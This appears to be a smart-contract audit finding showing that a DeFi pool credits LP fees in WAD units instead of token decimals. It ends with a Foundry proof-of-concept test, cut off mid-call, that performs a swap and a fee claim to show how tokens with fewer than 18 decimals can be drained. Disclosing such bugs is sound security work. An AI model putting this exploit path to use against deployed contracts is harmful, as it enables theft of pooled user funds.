When swapping, deltaInput is in WAD (not token decimals) units. Therefore, feeAmount is also in WAD as a percentage of deltaInput. When calling _feeSavingEffects(args.poolId, iteration) to determine whether to reinvest the fees in the pool or earmark them for LPs, a _syncFeeGrowthAccumulator is done with the following parameter: _syncFeeGrowthAccumulator(FixedPointMathLib.divWadDown(iteration.feeAmount, iteration.liquidity)) This is a WAD per liquidity value stored in _state.feeGrowthGlobal and also in pool.feeGrowthGlobalAsset through a subsequent _syncPool call. If an LP claims now and their fees are synced with syncPositionFees, their tokensOwed is set to: uint256 differenceAsset = AssemblyLib.computeCheckpointDistance( feeGrowthAsset=pool.feeGrowthGlobalAsset, self.feeGrowthAssetLast ); feeAssetEarned = FixedPointMathLib.mulWadDown(differenceAsset, self.freeLiquidity); self.tokensOwedAsset += SafeCastLib.safeCastTo128(feeAssetEarned); Then tokensOwedAsset is increased by a WAD value (WAD per WAD liquidity multiplied by WAD liquidity) and they have credited this WAD value with _applyCredit(msg.sender, asset, claimedAssets) which they can then withdraw as a token decimal value. The result is that LP fees are credited and can be withdrawn as WAD units and tokens with fewer than 18 decimals can be stolen from the protocol.
```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.4;
import "./Setup.sol";
import "forge-std/console2.sol";
contract TestSpearbit is Setup {
    function test_fee_decimal_bug()
        public
        sixDecimalQuoteConfig
        useActor
        usePairTokens(31e18)
        allocateSome(100e18) // deltaLiquidity
        isArmed
    {
        // Understand current pool values. create pair initializes from price
        // DEFAULT_STRIKE=10e18 = 10.0 quote per asset = 1e7/1e18 = 1e-11
        uint256 reserve_asset = ghost().reserve(ghost().asset().to_addr());
        uint256 reserve_quote = ghost().reserve(ghost().quote().to_addr());
        assertEq(reserve_asset, 30.859596948332370800e18);
        assertEq(reserve_quote, 308.595965e6);
        // Do swap from quote -> asset, so we catch fee on quote
        bool sellAsset = false;
        // amtIn is in quote. gets scaled to WAD in `_swap`.
        uint128 amtIn = 100; // 0.0001$ ~ 1e14 iteration.input
        uint128 amtOut =
            uint128(subject().getAmountOut(ghost().poolId, sellAsset, amtIn));
        {
            // verify that before swap, we have no credit
            uint256 credited = ghost().balance(actor(), ghost().quote().to_addr());
            assertEq(credited, 0, "token-credit");
        }
        uint256 pre_swap_balance = ghost().quote().to_token().balanceOf(actor());
        subject().multiprocess(
            FVMLib.encodeSwap(
                uint8(0),
                ghost().poolId,
                amtIn,
                amtOut,
                uint8(sellAsset ? 1 : 0)
            )
        );
        subject().multiprocess(
            // claim it all
            FVMLib.encodeClaim(ghost().poolId, type(uint128).max, type(uint128).max)
